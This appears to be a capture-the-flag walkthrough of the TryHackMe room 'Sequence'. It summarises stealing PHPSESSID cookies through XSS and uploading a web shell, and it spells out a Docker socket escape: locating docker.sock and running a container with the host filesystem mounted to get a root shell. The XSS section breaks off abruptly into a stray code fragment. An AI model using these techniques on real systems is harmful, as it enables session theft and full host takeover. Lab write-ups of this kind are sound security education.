# Summary
[Sequence](https://tryhackme.com/room/sequence){:target="_blank"} is a tryhackme room where we exploit a **Cross-Site Scripting (XSS)** vulnerability in a contact form to hijack user sessions. With an admin session we gain access to further functionality, where we exploit an **Unrestricted File Upload** vulnerability to upload a **web shell** and gain **remote code execution** in the **Docker** container that is running the application. Finally, we escape the container by utilizing the **Docker socket** that is mounted inside the container.

---

It turns out that both the name field and message field is vulnerable to `XSS`, so we can use it to steal the `PHPSESSID` cookie of users who review the forms we submit (as we noted earlier the `httponly` flag is not set for `PHPSESSID`).

We can see some filtering code in the page source code that blocks some keywords commonly used in `XSS` payloads:

});

## Docker Escape
---

Our shell is running inside a docker container, as indicated by `.dockerenv` in the file system root.

```terminal
root@4f18a45cca05:~# ls -la /
total 60
drwxr-xr-x   1 root root 4096 Jun  4 15:46 .
drwxr-xr-x   1 root root 4096 Jun  4 15:46 ..
-rwxr-xr-x   1 root root    0 Jun  4 15:46 .dockerenv
<SNIP>
```

Enumerating the container, we find that the docker socket is mounted.

```terminal
root@4f18a45cca05:~# find / -name "docker.sock" 2>/dev/null
/run/docker.sock
```

Furthermore, we are able to run docker commands inside the container.

```terminal
root@4f18a45cca05:~# docker image list
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
phpvulnerable   latest    d0bf58293d3b   5 months ago   926MB
php             8.1-cli   0ead645a9bc2   8 months ago   527MB
```

We can abuse this by running a container with the host's file system mounted.

```terminal
root@4f18a45cca05:~# docker run -v /:/mnt --rm -it php:8.1-cli chroot /mnt bash

```

Command explanation:
- `docker run` to run a command in a new container.
- `-v /:/mnt` to mount the host's file system `/` to `/mnt` in the container.
- `--rm` to remove the container after we exit.
- `-it` to run the container interactively.
- `php:8.1-cli` is the image, it is one of the images we listed earlier.
- `chroot /mnt` to change the root directory of the container to `/mnt`, which is the host file system we mounted.
- `bash` is the command to run, and we want to run a bash shell.

We then have full access to the host file system, and find the flag in `/root`.

```terminal
root@e0dab901e085:/# ls /root
 bin   flag.txt   lib   root   share   snap  '~'

root@e0dab901e085:/# cat /root/flag.txt
THM{REDACTED}
```
